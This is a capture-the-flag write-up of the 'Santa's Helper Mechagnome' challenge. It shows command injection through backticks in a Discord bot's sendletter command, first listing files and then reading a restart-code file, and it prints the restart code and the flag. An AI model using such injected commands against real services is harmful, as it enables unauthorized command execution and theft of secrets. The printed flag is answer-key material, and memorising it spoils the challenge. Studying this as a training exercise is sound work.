# Santa's Helper Mechagnome
Web

## Challenge 
	One of our main production Mechagnomes is now malfunctioning. You have to access its control panel by directly messaging Helper Mechagnome#9926 (You can find him resting on our main discord server).

	Get the restart codes, and restart it so that our toy factory can continue working!

	Author: Milkdrop

## Solution

A discord bot with a unsafe eval function.

	>> help
	MechaGnome v1.0  
	Santa's #1 Galvanized Helper Gnome

	Current State: CORRUPTEd?

	MechaGnome #9926 Control panel. You can execute the following commands:
	- help - Displays this message.
	- joke - Jokes in case of emergency.
	- add - Add the numbers x and y together. Used to test MechaGnome's internal ALU.
	    x - First Operand
	    y - Second Operand
	- list - List Departments
	- sendletter - Send an electronic letter to another department.
	     address@santa.com - Target Address
	     message - Message to Send
	- restart - Restart MechaGnome, recovering it from any corrupted state.

Vulnerability is in use of backticks
	
	>> sendletter hi `ls`

	MechaGnome v1.0  
	Santa's #1 Galvanized Helper Gnome

	Current State: CORRUPTEd?

	Sent the following message:
	mecha.py robot_restart_codes.txt

	To The following Address: hi

With this, we can read the restart code

	>> sendletter hi `cat robot_restart_codes.txt`

	MechaGnome v1.0  
	Santa's #1 Galvanized Helper Gnome

	Current State: CORRUPTEd?

	Sent the following message:
	Cobalt Inc. MechaGnome Restart Codes:\r XJACO-10U4C-C091U-VNOAC-J2QCS

	To The following Address: hi

And restart the server

	>> restart XJACO-10U4C-C091U-VNOAC-J2QCS

	MechaGnome v1.0  
	Santa's #1 Galvanized Helper Gnome

	Current State: CORRUPTEd?

	Restarting...
	Nice work! Flag: X-MAS{Wh0_Kn3W_4_H3lp3r_M3ch4gN0m3_W0uLd_b3_S0_vULN3R4bL3}


## Flag

	X-MAS{Wh0_Kn3W_4_H3lp3r_M3ch4gN0m3_W0uLd_b3_S0_vULN3R4bL3}
